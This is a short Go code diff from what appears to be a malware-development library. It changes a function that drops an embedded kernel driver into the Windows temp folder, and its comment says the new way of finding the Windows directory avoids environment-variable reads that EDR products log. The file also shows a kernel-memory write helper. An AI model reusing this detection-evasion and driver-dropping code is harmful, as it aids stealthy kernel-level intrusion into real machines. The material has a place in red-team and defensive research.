@@ -14,6 +14,7 @@ import (
 	"golang.org/x/sys/windows/svc/mgr"
 
 	"github.com/oioio-space/maldev/kernel/driver"
+	"github.com/oioio-space/maldev/recon/folder"
 )
 
 // ErrDriverBytesMissing is returned by Install when the caller did not
@@ -164,9 +165,14 @@ func (d *Driver) WriteKernel(addr uintptr, data []byte) (int, error) {
 
 // dropDriver writes the embedded driver bytes to a temp file and
 // returns its path. The caller must Remove the file during Uninstall.
+//
+// Resolves the Windows directory via SHGetKnownFolderPath(FOLDERID_Windows)
+// rather than os.Getenv("WINDIR") to avoid the PEB env-var sniff that
+// EDRs commonly log on driver-loading paths. Falls back to the canonical
+// C:\Windows on resolution failure.
 func dropDriver(b []byte) (string, error) {
-	dir := os.Getenv("WINDIR")
-	if dir == "" {
+	dir, err := folder.GetKnown(windows.FOLDERID_Windows, 0)
+	if err != nil {
 		dir = `C:\Windows`
 	}
 	dropPath := filepath.Join(dir, "Temp", ServiceName+".sys")
